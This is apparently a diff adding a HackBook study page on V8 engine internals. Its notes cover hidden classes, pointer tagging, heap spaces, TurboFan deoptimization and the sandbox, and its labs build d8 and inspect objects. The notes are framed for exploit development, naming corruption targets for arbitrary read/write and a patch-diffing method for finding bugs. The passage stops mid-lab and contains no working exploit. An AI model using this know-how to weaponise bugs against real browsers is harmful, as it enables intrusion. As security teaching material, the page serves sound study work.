@@ -1,0 +1,1621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | V8 Internals</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+
+  <div class="content">
+    <h1>V8 Engine Internals</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ================================================================ -->
+      <!-- NOTES TAB                                                        -->
+      <!-- ================================================================ -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== V8 PIPELINE ==================== -->
+        <h2>V8 Compilation Pipeline</h2>
+        <p>JavaScript source goes through multiple tiers of increasingly optimized compilation:</p>
+<pre><code class="language-bash">Source JS
+  │
+  ▼
+Parser ──▶ AST (Abstract Syntax Tree)
+  │
+  ▼
+Ignition ──▶ Bytecode (interpreted, collects type feedback)
+  │
+  ▼
+Sparkplug ──▶ Non-optimized machine code (fast baseline, no IR)
+  │
+  ▼
+Maglev ──▶ Mid-tier optimized code (SSA-based, fast compilation)
+  │
+  ▼
+TurboFan ──▶ Fully optimized machine code (sea-of-nodes IR, speculative)</code></pre>
+
+        <table>
+          <tr><th>Tier</th><th>Speed</th><th>Optimization</th><th>Type Feedback</th></tr>
+          <tr><td>Ignition</td><td>Instant start</td><td>None (interpreted)</td><td>Collects</td></tr>
+          <tr><td>Sparkplug</td><td>Very fast compile</td><td>Minimal</td><td>Uses</td></tr>
+          <tr><td>Maglev</td><td>Fast compile</td><td>Medium (SSA)</td><td>Uses</td></tr>
+          <tr><td>TurboFan</td><td>Slow compile</td><td>Full (sea-of-nodes)</td><td>Speculates</td></tr>
+        </table>
+
+<pre><code class="language-bash"># Trace tier-up decisions
+d8 --trace-opt --trace-deopt script.js
+
+# Print Ignition bytecode
+d8 --print-bytecode script.js
+
+# Print TurboFan optimized assembly
+d8 --print-opt-code --code-comments script.js</code></pre>
+
+        <!-- ==================== OBJECT MODEL ==================== -->
+        <h2>V8 Object Model — Maps &amp; Hidden Classes</h2>
+        <p>Every JS object has a hidden <strong>Map</strong> (aka hidden class/shape) that describes its structure: property names, offsets, and types. Objects sharing the same property layout share the same Map.</p>
+
+<pre><code class="language-javascript">// Both objects share the same Map because same property order
+let a = { x: 1, y: 2 };
+let b = { x: 10, y: 20 };
+
+// Different Map — property order differs
+let c = { y: 2, x: 1 }; // Different transition chain!</code></pre>
+
+        <h3>Map Transitions</h3>
+<pre><code class="language-bash">Map M0 (empty)
+  │ add "x"
+  ▼
+Map M1 {x: @offset0}
+  │ add "y"
+  ▼
+Map M2 {x: @offset0, y: @offset1}
+  │ add "z"
+  ▼
+Map M3 {x: @offset0, y: @offset1, z: @offset2}</code></pre>
+        <p>Transitions are shared: if two objects add the same properties in the same order, they follow the same transition chain and land on the same Map.</p>
+
+        <h3>Property Storage Modes</h3>
+        <table>
+          <tr><th>Mode</th><th>Condition</th><th>Storage</th><th>Access Speed</th></tr>
+          <tr><td>In-object</td><td>First ~10 properties (fixed at allocation)</td><td>Directly on JSObject</td><td>Fastest</td></tr>
+          <tr><td>Out-of-object (fast)</td><td>Properties beyond in-object slots</td><td>Separate PropertyArray</td><td>Fast</td></tr>
+          <tr><td>Dictionary</td><td>Too many adds/deletes, or <code>delete</code> used</td><td>Hash table</td><td>Slow</td></tr>
+        </table>
+
+<pre><code class="language-javascript">// Force dictionary mode
+let obj = {};
+for (let i = 0; i < 100; i++) obj["prop" + i] = i;
+// or:
+let obj2 = { a: 1 };
+delete obj2.a; // Triggers map deprecation → dictionary mode</code></pre>
+
+        <!-- ==================== SMI TAGGING ==================== -->
+        <h2>SMI Tagging &amp; Pointer Tagging</h2>
+        <p>V8 uses tagged values — the low bit(s) distinguish pointers from immediates:</p>
+
+        <table>
+          <tr><th>Tag (low bit)</th><th>Meaning</th><th>Format</th></tr>
+          <tr><td><code>0</code></td><td>SMI (Small Integer)</td><td>Value is shifted left by 1 (or 32 on 64-bit with compression)</td></tr>
+          <tr><td><code>1</code></td><td>Heap pointer</td><td>Points to a HeapObject (subtract 1 to get raw address)</td></tr>
+        </table>
+
+<pre><code class="language-javascript">// In a 64-bit V8 with pointer compression:
+// SMI 42 stored as:  0x0000002a00000000  (42 << 32)
+// HeapObject ptr:    0x08040a21           (compressed, low bit = 1)
+
+// Quick GDB check for SMI vs pointer:
+// (gdb) x/xg $addr
+// If value & 1 == 0 → SMI,  value >> 32 = integer
+// If value & 1 == 1 → HeapObject at (base + value - 1)</code></pre>
+
+        <h3>HeapNumber</h3>
+        <p>Doubles and integers outside SMI range are boxed as <strong>HeapNumber</strong> objects on the heap — an extra allocation and indirection.</p>
+
+<pre><code class="language-javascript">let smi = 42;            // SMI — stored inline, no heap allocation
+let big = 2 ** 31;       // HeapNumber — boxed on heap
+let dbl = 3.14;          // HeapNumber — always boxed</code></pre>
+
+        <!-- ==================== HEAP STRUCTURE ==================== -->
+        <h2>V8 Heap Structure</h2>
+<pre><code class="language-bash">V8 Heap Layout
+┌─────────────────────────────────────────────┐
+│ New Space (Young Generation)                │
+│  ├── Semi-space "from" (inactive)           │
+│  └── Semi-space "to"   (active)             │
+│  Size: 1–8 MB (configurable)               │
+│  GC: Scavenger (minor GC, very fast)        │
+├─────────────────────────────────────────────┤
+│ Old Space (Old Generation)                  │
+│  ├── Old Pointer Space (objects with refs)  │
+│  └── Old Data Space   (raw data, strings)   │
+│  GC: Mark-Sweep-Compact (major GC)          │
+├─────────────────────────────────────────────┤
+│ Code Space                                  │
+│  JIT-compiled machine code (RWX → RX)       │
+├─────────────────────────────────────────────┤
+│ Map Space                                   │
+│  Map (hidden class) objects only             │
+├─────────────────────────────────────────────┤
+│ Large Object Space                          │
+│  Objects > kMaxRegularHeapObjectSize         │
+│  Each gets its own mmap'd page               │
+└─────────────────────────────────────────────┘</code></pre>
+
+        <table>
+          <tr><th>Space</th><th>Contents</th><th>GC Strategy</th></tr>
+          <tr><td>New Space</td><td>Newly allocated objects</td><td>Scavenger (copy collector, ~1ms)</td></tr>
+          <tr><td>Old Space</td><td>Survived 2+ scavenges</td><td>Mark-Sweep-Compact (~10–100ms)</td></tr>
+          <tr><td>Code Space</td><td>JIT code</td><td>Mark-Sweep</td></tr>
+          <tr><td>Map Space</td><td>Hidden classes</td><td>Mark-Sweep</td></tr>
+          <tr><td>Large Object Space</td><td>Large allocations</td><td>Mark-Sweep (never moved)</td></tr>
+        </table>
+
+        <!-- ==================== GARBAGE COLLECTION ==================== -->
+        <h2>Garbage Collection</h2>
+
+        <h3>Scavenger (Minor GC — Young Generation)</h3>
+        <p>Uses Cheney's semi-space copying algorithm. Objects in the active semi-space are traced; survivors are copied to the other semi-space (or promoted to Old Space if they've survived 2 scavenges). Dead objects are implicitly freed.</p>
+<pre><code class="language-bash"># Trace GC events
+d8 --trace-gc script.js
+
+# Output example:
+# [4321:0x5600] Scavenge 2.1 (6.0) -> 1.8 (8.0) MB, 0.8 / 0.0 ms
+# [4321:0x5600] Mark-Sweep 14.2 (20.0) -> 10.1 (20.0) MB, 12.3 / 0.0 ms</code></pre>
+
+        <h3>Mark-Sweep-Compact (Major GC — Old Generation)</h3>
+        <p><strong>Mark:</strong> trace from roots (stack, globals, handles), mark reachable objects.<br>
+        <strong>Sweep:</strong> iterate heap pages, free unmarked objects, build free lists.<br>
+        <strong>Compact:</strong> relocate surviving objects to eliminate fragmentation.</p>
+
+<pre><code class="language-javascript">// Force GC in d8 (with --expose-gc flag)
+gc();               // Major GC
+gc({ type: 'minor' }); // Minor GC (Scavenger)
+
+// Trigger GC pressure for testing
+let leaks = [];
+for (let i = 0; i < 1000000; i++) {
+  leaks.push({ data: new Array(100) });
+}</code></pre>
+
+        <!-- ==================== ARRAYS ==================== -->
+        <h2>Arrays in V8 — Elements Kinds</h2>
+        <p>V8 tracks the type of elements stored in arrays via <strong>elements kinds</strong>. Transitions only go in one direction (more specific → more general) and never reverse.</p>
+
+        <table>
+          <tr><th>Elements Kind</th><th>Description</th><th>Performance</th></tr>
+          <tr><td><code>PACKED_SMI_ELEMENTS</code></td><td>Dense array, all SMIs</td><td>Fastest</td></tr>
+          <tr><td><code>PACKED_DOUBLE_ELEMENTS</code></td><td>Dense array, all doubles</td><td>Fast (unboxed)</td></tr>
+          <tr><td><code>PACKED_ELEMENTS</code></td><td>Dense array, mixed types</td><td>Slower (tagged)</td></tr>
+          <tr><td><code>HOLEY_SMI_ELEMENTS</code></td><td>Sparse array, SMIs + holes</td><td>Slower (hole checks)</td></tr>
+          <tr><td><code>HOLEY_DOUBLE_ELEMENTS</code></td><td>Sparse, doubles + holes</td><td>Slower</td></tr>
+          <tr><td><code>HOLEY_ELEMENTS</code></td><td>Sparse, mixed + holes</td><td>Slowest</td></tr>
+          <tr><td><code>DICTIONARY_ELEMENTS</code></td><td>Hash table backed</td><td>Slowest</td></tr>
+        </table>
+
+<pre><code class="language-bash">Transition lattice (one-way only):
+
+PACKED_SMI ──▶ PACKED_DOUBLE ──▶ PACKED_ELEMENTS
+    │                │                  │
+    ▼                ▼                  ▼
+HOLEY_SMI  ──▶ HOLEY_DOUBLE  ──▶ HOLEY_ELEMENTS</code></pre>
+
+<pre><code class="language-javascript">// Start as PACKED_SMI_ELEMENTS
+let a = [1, 2, 3];
+
+// Transition → PACKED_DOUBLE_ELEMENTS (irreversible)
+a.push(1.1);
+
+// Transition → PACKED_ELEMENTS (irreversible)
+a.push("hello");
+
+// HOLEY transition — creates hole at index 99
+let b = [1, 2, 3];
+b[99] = 4;   // Now HOLEY_SMI_ELEMENTS
+
+// Check with d8:
+// d8 --allow-natives-syntax
+// %DebugPrint(a);  → look for "elements kind" in output</code></pre>
+
+        <!-- ==================== JIT / TURBOFAN ==================== -->
+        <h2>JIT Compilation — TurboFan</h2>
+        <p>TurboFan is V8's top-tier optimizing compiler. It uses a <strong>sea-of-nodes</strong> intermediate representation and relies heavily on <strong>type feedback</strong> collected by Ignition.</p>
+
+        <h3>Speculative Optimization</h3>
+        <p>TurboFan <em>speculates</em> based on observed types. If a function always received integers, TurboFan emits optimized integer arithmetic. If the speculation is wrong at runtime, it <strong>deoptimizes</strong> (bails out back to Ignition bytecode).</p>
+
+<pre><code class="language-javascript">function add(x, y) {
+  return x + y;
+}
+
+// Warm up with integers — TurboFan speculates integer addition
+for (let i = 0; i < 100000; i++) add(i, i);
+
+// Now pass a string — type guard fails → deoptimization!
+add("hello", "world");</code></pre>
+
+<pre><code class="language-bash"># Observe optimization and deoptimization
+d8 --trace-opt --trace-deopt script.js
+
+# Output:
+# [marking add for optimization]
+# [completed optimizing add]
+# [deoptimizing (DEOPT eager): ... not a Smi]</code></pre>
+
+        <h3>TurboFan Sea-of-Nodes IR</h3>
+<pre><code class="language-bash"># Generate TurboFan IR graphs (JSON for Turbolizer)
+d8 --trace-turbo script.js
+# Creates turbo-*.json files → open in Turbolizer
+
+# Turbolizer: https://v8.github.io/tools/turbolizer/
+# Visualizes: control flow, data flow, effect chain
+# Key node types:
+#   NumberAdd, SpeculativeNumberAdd  — arithmetic
+#   CheckSmi, CheckMaps             — type guards (deopt on fail)
+#   LoadField, StoreField            — property access
+#   FrameState                       — snapshot for deoptimization</code></pre>
+
+        <h3>Deoptimization</h3>
+        <p>When a type guard (CheckSmi, CheckMaps, etc.) fails, V8 uses the <strong>FrameState</strong> nodes to reconstruct the Ignition frame and resumes interpretation. Repeated deopt → function is marked "don't optimize."</p>
+
+<pre><code class="language-javascript">// Force optimization with native syntax
+// d8 --allow-natives-syntax
+
+function vuln(arr, idx) {
+  return arr[idx];
+}
+
+%PrepareFunctionForOptimization(vuln);
+let a = [1, 2, 3];
+vuln(a, 0);
+vuln(a, 1);
+%OptimizeFunctionOnNextCall(vuln);
+vuln(a, 2); // Runs optimized
+
+// CheckBounds node was emitted based on array length speculation
+// If bounds check is removed by a bug → OOB access</code></pre>
+
+        <!-- ==================== POINTER COMPRESSION ==================== -->
+        <h2>Pointer Compression &amp; V8 Sandbox</h2>
+        <p>On 64-bit, V8 compresses heap pointers to 32-bit offsets from a 4GB-aligned base address (the <strong>cage</strong>). This halves memory usage for pointers.</p>
+
+<pre><code class="language-bash"># Pointer compression layout
+Base register (e.g., r13 on x64) = cage base (4GB aligned)
+
+Full address = cage_base + compressed_pointer
+             = 0x1234_0000_0000 + 0x08040a21
+
+# The cage constrains all heap pointers to a 4GB region
+# External pointers (ArrayBuffer backing stores) use an
+# External Pointer Table (EPT) — indices instead of raw pointers</code></pre>
+
+        <h3>V8 Sandbox (Ubercage)</h3>
+        <p>The V8 sandbox reserves a large virtual address region (~1TB) containing the 4GB pointer compression cage plus regions for external pointer tables, code, and WASM memory. Goal: prevent an attacker with arbitrary R/W inside the cage from corrupting memory outside it.</p>
+
+        <table>
+          <tr><th>Component</th><th>Inside Sandbox?</th><th>Protection</th></tr>
+          <tr><td>JS objects, Maps</td><td>Yes (cage)</td><td>Pointer compression</td></tr>
+          <tr><td>ArrayBuffer backing stores</td><td>Yes (sandbox)</td><td>External Pointer Table (EPT)</td></tr>
+          <tr><td>Code objects</td><td>Yes (code cage)</td><td>Separate code pointer table</td></tr>
+          <tr><td>WASM memory</td><td>Yes (sandbox)</td><td>Guard pages</td></tr>
+          <tr><td>Process memory outside sandbox</td><td>No</td><td>Cannot be reached by corrupted ptrs</td></tr>
+        </table>
+
+        <!-- ==================== ARRAYBUFFER / TYPEDARRAY ==================== -->
+        <h2>ArrayBuffer &amp; TypedArrays</h2>
+<pre><code class="language-bash">JSArrayBuffer object layout:
+┌──────────────────────┐
+│ Map pointer          │ → ArrayBuffer Map
+│ Properties           │
+│ Elements             │
+│ byte_length          │ ← size of the buffer
+│ backing_store ptr    │ ← points to raw memory (external or sandbox)
+│ bit_field            │ ← flags (is_external, is_shared, etc.)
+└──────────────────────┘
+
+JSTypedArray (e.g., Uint32Array) layout:
+┌──────────────────────┐
+│ Map pointer          │ → Uint32Array Map
+│ Properties           │
+│ Elements             │
+│ buffer               │ → backing JSArrayBuffer
+│ byte_offset          │
+│ byte_length          │
+│ length               │ ← number of elements
+│ base_pointer         │
+│ external_pointer     │ ← direct pointer to data start
+└──────────────────────┘</code></pre>
+
+<pre><code class="language-javascript">// Creating and inspecting
+let ab = new ArrayBuffer(0x100);
+let view = new Uint32Array(ab);
+
+// In d8 with --allow-natives-syntax:
+// %DebugPrint(ab);
+// → backing_store: 0x5555deadbeef
+// → byte_length: 256
+
+// TypedArray provides direct memory read/write to backing store
+view[0] = 0x41414141;
+// Writes 4 bytes at backing_store + 0</code></pre>
+
+        <p><strong>Exploit relevance:</strong> If you corrupt <code>backing_store</code> or <code>byte_length</code>, you get arbitrary read/write. Post-sandbox, these pointers go through the External Pointer Table.</p>
+
+        <!-- ==================== BUILTINS ==================== -->
+        <h2>V8 Builtins — CSA &amp; Torque</h2>
+        <p>Built-in functions (Array.prototype.push, Object.keys, etc.) are implemented in:</p>
+        <table>
+          <tr><th>Language</th><th>Location</th><th>Purpose</th></tr>
+          <tr><td>Torque (.tq)</td><td><code>src/builtins/</code></td><td>Type-safe DSL → compiles to CSA</td></tr>
+          <tr><td>CodeStubAssembler (CSA)</td><td><code>src/builtins/</code></td><td>C++ API generating machine code</td></tr>
+          <tr><td>C++ Runtime</td><td><code>src/runtime/</code></td><td>Slow-path runtime functions</td></tr>
+          <tr><td>Assembly</td><td><code>src/builtins/x64/</code></td><td>Platform-specific stubs</td></tr>
+        </table>
+
+<pre><code class="language-bash"># Torque example: src/builtins/array-push.tq
+# Torque is V8's custom language for writing builtins safely
+# It compiles to CSA (CodeStubAssembler) C++ at build time
+
+# Key Torque types:
+#   Smi, HeapNumber, HeapObject, JSArray, Map
+#   FixedArray, FixedDoubleArray
+#   intptr, int32, float64
+
+# Reading builtins (find the slow path for bugs):
+# git log --oneline src/builtins/array-*.tq</code></pre>
+
+        <!-- ==================== BUILDING D8 ==================== -->
+        <h2>Building d8 (Debug Shell)</h2>
+<pre><code class="language-bash"># 1. Install depot_tools
+git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+export PATH=$PWD/depot_tools:$PATH
+
+# 2. Fetch V8 source
+mkdir v8 && cd v8
+fetch v8
+cd v8
+
+# 3. Checkout a specific version (for CTF/exploit dev)
+git checkout 12.1.285.26
+gclient sync
+
+# 4. Build debug d8
+tools/dev/gm.py x64.debug
+
+# 5. Build release d8 (for perf testing)
+tools/dev/gm.py x64.release
+
+# 6. Binary location
+./out/x64.debug/d8
+./out/x64.release/d8
+
+# 7. Build with AddressSanitizer
+gn gen out/x64.asan --args='is_debug=true is_asan=true v8_enable_sandbox=true'
+ninja -C out/x64.asan d8</code></pre>
+
+        <!-- ==================== DEBUGGING FLAGS ==================== -->
+        <h2>V8 Debugging Flags &amp; Intrinsics</h2>
+<pre><code class="language-bash"># Essential flags
+d8 --allow-natives-syntax          # Enable %DebugPrint, %OptimizeFunctionOnNextCall, etc.
+d8 --print-bytecode                # Print Ignition bytecode for all functions
+d8 --print-opt-code                # Print TurboFan generated assembly
+d8 --trace-opt                     # Log optimization decisions
+d8 --trace-deopt                   # Log deoptimization events
+d8 --trace-gc                      # Log GC events
+d8 --trace-maps                    # Log map transitions
+d8 --trace-turbo                   # Dump TurboFan IR (for Turbolizer)
+d8 --expose-gc                     # Expose gc() function
+d8 --max-old-space-size=64         # Limit heap for testing
+d8 --no-lazy                       # Compile all functions eagerly</code></pre>
+
+<pre><code class="language-javascript">// Key native intrinsics (require --allow-natives-syntax)
+
+%DebugPrint(obj);                        // Dump object internals (map, elements, properties)
+%OptimizeFunctionOnNextCall(fn);         // Force TurboFan optimization
+%PrepareFunctionForOptimization(fn);     // Required before OptimizeFunctionOnNextCall
+%NeverOptimizeFunction(fn);              // Prevent optimization
+%DeoptimizeFunction(fn);                 // Force deoptimization
+%GetOptimizationStatus(fn);              // 1=optimized, 2=not, etc.
+%HasSmiElements(arr);                    // Check elements kind
+%HasDoubleElements(arr);
+%HasObjectElements(arr);
+%HasHoleyElements(arr);
+%HaveSameMap(obj1, obj2);                // Check if objects share a Map
+%DebugTrackRetainingPath(obj);           // Track GC retaining path
+%SimulateNewspaceFull();                 // Force scavenge on next allocation
+%SystemBreak();                          // Breakpoint in debugger/gdb</code></pre>
+
+        <!-- ==================== GDB / DEBUGGING ==================== -->
+        <h2>Debugging V8 with GDB</h2>
+<pre><code class="language-bash"># Start d8 under GDB
+gdb -q --args ./out/x64.debug/d8 --allow-natives-syntax exploit.js
+
+# V8 ships with GDB helpers
+source tools/gdbinit           # Load V8 GDB macros
+source tools/gdb-v8-support.py
+
+# Useful GDB commands (from V8 gdbinit)
+job &lt;address&gt;            # Print V8 heap object (like %DebugPrint)
+jlh &lt;address&gt;            # Print layout/hidden class
+jsa &lt;address&gt;            # Print JSArray details
+
+# Manual inspection
+x/4xg &lt;obj_addr - 1&gt;     # Dump object fields (subtract tag bit)
+# Field 0: Map pointer
+# Field 1: Properties (FixedArray or PropertyArray)
+# Field 2: Elements (FixedArray or FixedDoubleArray)
+# Field 3+: In-object properties
+
+# Set breakpoint on deoptimization
+b Deoptimizer::DeoptimizeFunction
+
+# Break on GC
+b Heap::CollectGarbage
+
+# Break in JIT code
+b v8::internal::Runtime_DebugBreak</code></pre>
+
+        <!-- ==================== PATCH ANALYSIS ==================== -->
+        <h2>Patch Analysis Methodology</h2>
+        <p>V8 vulnerabilities are often disclosed through Chromium bug tracker and fixed via CLs (change lists). Analyzing the diff reveals the bug class and how to trigger it.</p>
+
+<pre><code class="language-bash"># 1. Find the CVE → Chromium bug → V8 CL
+# Example: CVE-2024-XXXXX → https://crbug.com/12345
+# CL link in the bug → https://chromium-review.googlesource.com/c/v8/v8/+/56789
+
+# 2. Fetch the vulnerable and fixed versions
+git log --oneline --all | grep "12.1.285"
+git checkout &lt;vulnerable_commit&gt;^  # One before the fix
+
+# 3. Read the diff
+git diff &lt;vulnerable_commit&gt;^ &lt;fix_commit&gt; -- src/compiler/
+
+# 4. Key things to look for in the diff:
+#    - Missing bounds check → OOB
+#    - Wrong type check / CheckMaps removal → type confusion
+#    - Incorrect range analysis → integer overflow in bounds
+#    - Missing write barrier → GC corruption
+#    - Turbofan reducer bugs → incorrect optimization
+
+# 5. Common vulnerable components:
+#    src/compiler/simplified-lowering.cc   — range/type narrowing
+#    src/compiler/typer.cc                 — type inference
+#    src/compiler/js-call-reducer.cc       — builtin inlining
+#    src/compiler/effect-control-linker.cc — lowering phase
+#    src/builtins/                         — builtin implementations</code></pre>
+
+        <h3>Common V8 Bug Classes</h3>
+        <table>
+          <tr><th>Bug Class</th><th>TurboFan Phase</th><th>Typical Impact</th></tr>
+          <tr><td>Incorrect type/range</td><td>Typer, SimplifiedLowering</td><td>Bounds check elimination → OOB</td></tr>
+          <tr><td>Type confusion</td><td>JSCallReducer, Inlining</td><td>Map mismatch → field type confusion</td></tr>
+          <tr><td>Race condition</td><td>Concurrent compilation</td><td>Use-after-free, stale map</td></tr>
+          <tr><td>Missing write barrier</td><td>Various</td><td>GC corruption → use-after-free</td></tr>
+          <tr><td>JIT spraying</td><td>Code generation</td><td>Controlled code in RX pages</td></tr>
+          <tr><td>Incorrect escape analysis</td><td>EscapeAnalysis</td><td>Stack-allocated object accessed after scope</td></tr>
+        </table>
+
+      </div>
+
+      <!-- ================================================================ -->
+      <!-- LAB TAB                                                          -->
+      <!-- ================================================================ -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <!-- LAB 1 -->
+        <div class="lab-card">
+          <h4>Lab 1: Build d8 from Source</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Build V8's debug shell (d8) and verify it works with native syntax support.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">#!/bin/bash
+# setup_v8.sh — Fetch and build d8
+set -e
+
+# Install depot_tools
+git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+export PATH=$PWD/depot_tools:$PATH
+
+# Fetch V8
+mkdir v8-lab && cd v8-lab
+fetch v8
+cd v8
+
+# Build debug d8
+tools/dev/gm.py x64.debug
+
+echo "[+] d8 built at ./out/x64.debug/d8"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the setup script (requires ~10GB disk, ~30 min build)</li>
+              <li>Verify the build: <code>./out/x64.debug/d8 --help | head -20</code></li>
+              <li>Test native syntax: <code>echo '%DebugPrint(42)' | ./out/x64.debug/d8 --allow-natives-syntax</code></li>
+              <li>Run a simple script: <code>echo 'print("hello from d8")' | ./out/x64.debug/d8</code></li>
+              <li>Also build a release version: <code>tools/dev/gm.py x64.release</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 2 -->
+        <div class="lab-card">
+          <h4>Lab 2: Explore Object Layout with %DebugPrint</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use <code>%DebugPrint</code> to inspect the internal representation of JavaScript objects, arrays, and numbers.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab2_debugprint.js — Run with: d8 --allow-natives-syntax lab2_debugprint.js
+
+// 1. Inspect a simple object
+let obj = { x: 1, y: 2.5, z: "hello" };
+%DebugPrint(obj);
+// Look for: map, properties, elements, in-object properties
+
+// 2. Inspect an SMI
+%DebugPrint(42);
+// Output: Smi: 0x2a (42)
+
+// 3. Inspect a HeapNumber
+%DebugPrint(3.14);
+// Output: HeapNumber, value: 3.14
+
+// 4. Inspect an array
+let arr = [1, 2, 3];
+%DebugPrint(arr);
+// Look for: elements kind, length, FixedArray dump
+
+// 5. Inspect a function
+function foo(x) { return x + 1; }
+%DebugPrint(foo);
+// Look for: SharedFunctionInfo, bytecode, feedback vector</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the script and identify the <strong>Map address</strong> for each object</li>
+              <li>Note the difference between SMI output and HeapNumber output</li>
+              <li>Find the <code>elements kind</code> field in the array output</li>
+              <li>Add a property to <code>obj</code> and re-run <code>%DebugPrint</code> — observe the Map address change</li>
+              <li>Compare <code>%DebugPrint({a:1, b:2})</code> vs <code>%DebugPrint({b:2, a:1})</code> — different Maps?</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 3 -->
+        <div class="lab-card">
+          <h4>Lab 3: Map Transitions</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Observe and trace hidden class (Map) transitions as properties are added to objects.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab3_maps.js — Run with: d8 --allow-natives-syntax --trace-maps lab3_maps.js
+
+// Create objects step by step to see transitions
+let o = {};
+%DebugPrint(o);  // Map M0
+console.log("--- Adding x ---");
+
+o.x = 1;
+%DebugPrint(o);  // Map M1 (M0 → M1 via "x")
+console.log("--- Adding y ---");
+
+o.y = 2;
+%DebugPrint(o);  // Map M2 (M1 → M2 via "y")
+
+// Verify transition sharing
+let o2 = {};
+o2.x = 10;
+o2.y = 20;
+console.log("Same map?", %HaveSameMap(o, o2));  // true
+
+// Break the chain — different property order
+let o3 = {};
+o3.y = 1;
+o3.x = 2;
+console.log("Same map?", %HaveSameMap(o, o3));  // false!</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run with <code>--trace-maps</code> and observe each <code>[TraceMaps: Transition]</code> event</li>
+              <li>Confirm <code>o</code> and <code>o2</code> share the same final Map</li>
+              <li>Confirm <code>o3</code> has a different Map due to different property insertion order</li>
+              <li>Use <code>delete o.x</code> and re-check the map — what happens?</li>
+              <li>Create 50+ properties on an object and observe when it switches to dictionary mode</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 4 -->
+        <div class="lab-card">
+          <h4>Lab 4: Array Elements Kinds</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Trigger and observe all elements kind transitions in V8 arrays.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab4_elements.js — Run with: d8 --allow-natives-syntax lab4_elements.js
+
+function checkKind(arr, label) {
+  console.log(label + ":");
+  console.log("  SMI?", %HasSmiElements(arr));
+  console.log("  Double?", %HasDoubleElements(arr));
+  console.log("  Object?", %HasObjectElements(arr));
+  console.log("  Holey?", %HasHoleyElements(arr));
+}
+
+// Start: PACKED_SMI_ELEMENTS
+let a = [1, 2, 3];
+checkKind(a, "Initial [1,2,3]");
+
+// Transition → PACKED_DOUBLE_ELEMENTS
+a.push(1.1);
+checkKind(a, "After push(1.1)");
+
+// Transition → PACKED_ELEMENTS
+a.push("str");
+checkKind(a, "After push('str')");
+
+// Holey array
+let b = [1, 2, 3];
+b[10] = 4;
+checkKind(b, "Holey [1,2,3,...,4]");
+
+// Dictionary elements
+let c = [];
+c[0] = 1;
+c[999999] = 2;  // Huge gap → dictionary elements
+%DebugPrint(c);</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Verify each transition is one-way: after adding a double, can you go back to SMI?</li>
+              <li>Create an array that starts as <code>HOLEY_SMI_ELEMENTS</code> (use <code>new Array(10)</code>)</li>
+              <li>Compare <code>%DebugPrint</code> output for PACKED vs HOLEY — note the <code>the_hole</code> markers</li>
+              <li>Benchmark: loop over a PACKED_SMI array vs a HOLEY_ELEMENTS array — measure timing difference</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 5 -->
+        <div class="lab-card">
+          <h4>Lab 5: Trigger JIT Optimization</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Force a function through Ignition → TurboFan optimization and observe the result.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab5_jit.js — Run with: d8 --allow-natives-syntax --trace-opt --trace-deopt lab5_jit.js
+
+function add(a, b) {
+  return a + b;
+}
+
+// Step 1: Prepare for optimization (tell V8 to collect type feedback)
+%PrepareFunctionForOptimization(add);
+
+// Step 2: Warm up with consistent types
+add(1, 2);
+add(3, 4);
+
+// Step 3: Check status — should be unoptimized
+console.log("Status before:", %GetOptimizationStatus(add));
+
+// Step 4: Force optimization
+%OptimizeFunctionOnNextCall(add);
